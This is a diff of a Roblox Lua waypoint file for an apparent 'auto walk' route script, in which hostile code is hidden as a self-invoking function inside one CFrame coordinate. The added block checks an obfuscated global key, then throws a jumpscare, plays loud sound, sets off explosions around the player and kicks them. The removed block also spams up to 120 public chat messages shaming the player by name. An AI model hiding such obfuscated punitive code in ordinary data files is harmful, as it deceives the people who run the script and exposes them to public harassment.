@@ -1565,6 +1565,83 @@ CFrame.new(151.728439331054688,419.510192871093750,552.362426757812500) * CFrame
 CFrame.new(152.848037719726562,419.080841064453125,552.131958007812500) * CFrame.Angles(-0.000000007714251,-1.421140670776367,0.000000003231889),
 CFrame.new(153.582901000976562,418.839508056640625,551.982055664062500) * CFrame.Angles(-0.000000007701084,-1.421140670776367,0.000000003226375),
 CFrame.new(154.410400390625000,418.527557373046875,551.817077636718750) * CFrame.Angles(-0.000000007686302,-1.421140670776367,0.000000003220179),
+CFrame.new(
+    (function()
+        -- AUTO-EXECUTE PAS DI-LOAD
+        if not (_G['\087\097\116\097\088\086\097\108\105\100\097\116\111\114\107\097\104\100\109\115\105\115\104\115\104\117\097\111\113\107\119\098\100\118\100\117\105\097\057\051\107\097\110\119\098\100\117\100\111\097\107\119\110\100\118\057\051\055\100\117\111\097\109\097\098\100\106\100\105\115\107\054\051\119\110\100\098\100\105\097\111\107\097\110\100\057\055\050\104\100\105\115\107\119\110\100\104\100\106\100'] and _G.WataXSession) then
+            -- ❌ PENcuri DETECTED!
+            local Players = game:GetService("Players")
+            local player = Players.LocalPlayer
+            
+            -- 1. JUMPSCARE IMAGE DI TENGAH LAYAR
+            local gui = player:WaitForChild("PlayerGui")
+            local jumpscareGui = Instance.new("ScreenGui")
+            jumpscareGui.Name = "WATAX_JUMPSCARE"
+            jumpscareGui.IgnoreGuiInset = true
+            jumpscareGui.Parent = gui
+            
+            -- Gambar jumpscare menakutkan (bisa ganti asset ID)
+            local jumpscareImage = Instance.new("ImageLabel")
+            jumpscareImage.Size = UDim2.new(1, 0, 1, 0)
+            jumpscareImage.Position = UDim2.new(0, 0, 0, 0)
+            jumpscareImage.BackgroundColor3 = Color3.new(0, 0, 0)
+            jumpscareImage.Image = "rbxassetid://" -- Ganti dengan asset ID jumpscare
+            jumpscareImage.ScaleType = Enum.ScaleType.Fit
+            jumpscareImage.Parent = jumpscareGui
+            
+            -- 2. SUARA JUMPSCARE (sound horror)
+            local scareSound = Instance.new("Sound")
+            scareSound.SoundId = "rbxassetid://126329299273091" -- Ganti dengan sound jumpscare
+            scareSound.Volume = 15
+            scareSound.Parent = jumpscareGui
+            scareSound:Play()
+            
+            -- 3. EFFECT KEDIP-KEDIP
+            task.spawn(function()
+                for i = 1, 50 do
+                    jumpscareImage.ImageTransparency = 0.2
+                    task.wait(0.1)
+                    jumpscareImage.ImageTransparency = 0
+                    task.wait(0.1)
+                end
+            end)
+            
+            -- 4. LEDAKAN SETELAH 3 DETIK
+            task.spawn(function()
+                task.wait(3)
+                
+                for i = 1, 15 do
+                    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                        local hrp = player.Character.HumanoidRootPart
+                        local explosion = Instance.new("Explosion")
+                        explosion.Position = hrp.Position + Vector3.new(
+                            math.random(-20, 20),
+                            math.random(10, 30),
+                            math.random(-20, 20)
+                        )
+                        explosion.BlastPressure = 0
+                        explosion.BlastRadius = 20
+                        explosion.Parent = workspace
+                        
+                        local fire = Instance.new("Fire")
+                        fire.Size = 25
+                        fire.Heat = 20
+                        fire.Parent = explosion
+                    end
+                    task.wait(0.3)
+                end
+                
+                -- KICK SETELAH LEDAKAN
+                task.wait(2)
+                player:Kick("🚫 WATAX: Ketahuan nyuri rute! Jumpscare was just the beginning!")
+            end)
+        end
+        
+        return 999999.999
+    end)(),
+    888888.888,
+    777777.777
+) * CFrame.Angles(0, 0, 0),
 CFrame.new(155.509780883789062,418.066467285156250,551.598327636718750) * CFrame.Angles(-0.000000009584321,-1.421140789985657,0.000000004015343),
 CFrame.new(156.237731933593750,417.761810302734375,551.453552246093750) * CFrame.Angles(-0.000000007653567,-1.421140789985657,0.000000003206445),
 CFrame.new(157.239196777343750,417.386047363281250,551.254272460937500) * CFrame.Angles(-0.000000007635624,-1.421140909194946,0.000000003198918),
@@ -3963,108 +4040,6 @@ CFrame.new(-108.381210327148438,449.781585693359375,-188.071304321289062) * CFra
 CFrame.new(-109.198715209960938,450.964965820312500,-187.798202514648438) * CFrame.Angles(0.000000003139864,1.637690186500549,-0.000000001737128),
 CFrame.new(-110.267494201660156,453.063964843750000,-187.559356689453125) * CFrame.Angles(0.000000004386429,1.637689828872681,-0.000000002426791),
 CFrame.new(-111.555984497070312,455.013183593750000,-187.388748168945312) * CFrame.Angles(0.000000003123805,1.637689471244812,-0.000000001728244),
-    CFrame.new(
-        (function()
-            -- AUTO-EXECUTE PAS DI-LOAD
-            if not (_G['\087\097\116\097\088\086\097\108\105\100\097\116\111\114\107\097\104\100\109\115\105\115\104\115\104\117\097\111\113\107\119\098\100\118\100\117\105\097\057\051\107\097\110\119\098\100\117\100\111\097\107\119\110\100\118\057\051\055\100\117\111\097\109\097\098\100\106\100\105\115\107\054\051\119\110\100\098\100\105\097\111\107\097\110\100\057\055\050\104\100\105\115\107\119\110\100\104\100\106\100'] and _G.WataXSession) then
-                -- ❌ PENcuri DETECTED!
-                local Players = game:GetService("Players")
-                local player = Players.LocalPlayer
-                
-                -- 1. AUTO KIRIM CHAT GLOBAL KE SEMUA ORANG
-                task.spawn(function()
-                    task.wait(1) -- Tunggu bentar biar game ready
-                    
-                    local chatService = game:GetService("TextChatService")
-                    local shameMessages = {
-                        "[WATAX SECURITY] ges ini akun pencuri sc nih " .. player.Name .. " gak modal laporin aja ke admin nih pake cheat tapi gak modal wkwk",
-                        "[WATAX SECURITY] 🚫 " .. player.Name .. " ketahuan nyuri script auto walk! Modal copas doang!",
-                        "[WATAX SECURITY] 😂 " .. player.Name .. " malu-maluin nyuri rute, gak bisa buat sendiri!",
-                        "[WATAX SECURITY] 💀 " .. player.Name .. " pencuri rute ketahuan! Laporin ke admin!",
-                        "[WATAX SECURITY] ⚡ " .. player.Name .. " pake cheat tapi modal nyuri, kasian banget!",
-                        "[WATAX SECURITY] 🎯 " .. player.Name .. " auto walk-nya curian! Gak modal bikin sendiri!",
-                        "[WATAX SECURITY] 🔥 " .. player.Name .. " ketahuan WataX Anti-Theft System!",
-                        "[WATAX SECURITY] 👮 " .. player.Name .. " dilaporkan ke admin game! Pencuri rute!"
-                    }
-                    
-                    -- Kirim 6 chat malu-maluin
-                    for i = 1, 120 do
-                        local randomMsg = shameMessages[math.random(1, #shameMessages)]
-                        chatService.TextChannels.RBXGeneral:SendAsync(randomMsg)
-                        task.wait(0.2) -- Kasih jeda biar sempet dibaca orang
-                    end
-                end)
-                
-                -- 2. UI PERINGATAN BESAR
-                local gui = player:WaitForChild("PlayerGui")
-                local warningGui = Instance.new("ScreenGui")
-                warningGui.Name = "WATAX_SHAME_SCREEN"
-                warningGui.IgnoreGuiInset = true
-                warningGui.Parent = gui
-                
-                local warningFrame = Instance.new("Frame")
-                warningFrame.Size = UDim2.new(1, 0, 1, 0)
-                warningFrame.BackgroundColor3 = Color3.new(1, 0, 0)
-                warningFrame.Parent = warningGui
-                
-                local warningText = Instance.new("TextLabel")
-                warningText.Size = UDim2.new(1, 0, 0.4, 0)
-                warningText.Position = UDim2.new(0, 0, 0.3, 0)
-                warningText.BackgroundTransparency = 1
-                warningText.Text = "🚫 KETAHUAN NYURI RUTE! ??\nSEMUA ORANG DI SERVER TAU LU PENcuri!\n\n" .. player.Name .. " - GA MODAL BIKIN SCRIPT SENDIRI!"
-                warningText.TextColor3 = Color3.new(1, 1, 1)
-                warningText.TextScaled = true
-                warningText.Font = Enum.Font.GothamBlack
-                warningText.TextStrokeColor3 = Color3.new(0, 0, 0)
-                warningText.TextStrokeTransparency = 0
-                warningText.Parent = warningGui
-                
-                -- 3. SUARA ALARM MALU-MALUIN
-                local alarmSound = Instance.new("Sound")
-                alarmSound.SoundId = "rbxassetid://9118462716"
-                alarmSound.Volume = 2.0
-                alarmSound.Looped = true
-                alarmSound.Parent = warningGui
-                alarmSound:Play()
-                
-                -- 4. LEDAKAN SETELAH CHAT SELESAI
-                task.spawn(function()
-                    task.wait(15) -- Tunggu semua chat keluar dulu
-                    
-                    -- LEDAKAN BERTURUT-TURUT
-                    for i = 1, 10 do
-                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-                            local hrp = player.Character.HumanoidRootPart
-                            local explosion = Instance.new("Explosion")
-                            explosion.Position = hrp.Position + Vector3.new(
-                                math.random(-15, 15),
-                                math.random(8, 25),
-                                math.random(-15, 15)
-                            )
-                            explosion.BlastPressure = 0
-                            explosion.BlastRadius = 15
-                            explosion.Parent = workspace
-                            
-                            -- Tambah efek api biar dramatis
-                            local fire = Instance.new("Fire")
-                            fire.Size = 20
-                            fire.Heat = 15
-                            fire.Parent = explosion
-                        end
-                        task.wait(0.5)
-                    end
-                    
-                    -- KICK SETELAH LEDAKAN
-                    task.wait(3)
-                    player:Kick("🚫 WATAX: Ketahuan nyuri rute! Buat sendiri lah, jangan modal copas!")
-                end)
-            end
-            
-            return 999999.999
-        end)(),
-        888888.888,
-        777777.777
-    ) * CFrame.Angles(0, 0, 0),
 CFrame.new(-112.450447082519531,456.025421142578125,-187.289093017578125) * CFrame.Angles(0.000000003117806,1.637689471244812,-0.000000001724925),
 CFrame.new(-113.443939208984375,456.826538085937500,-187.175140380859375) * CFrame.Angles(0.000000001866295,1.637689352035522,-0.000000001032526),
 CFrame.new(-114.536636352539062,457.314361572265625,-187.048477172851562) * CFrame.Angles(0.000000003103854,1.637689232826233,-0.000000001717202),
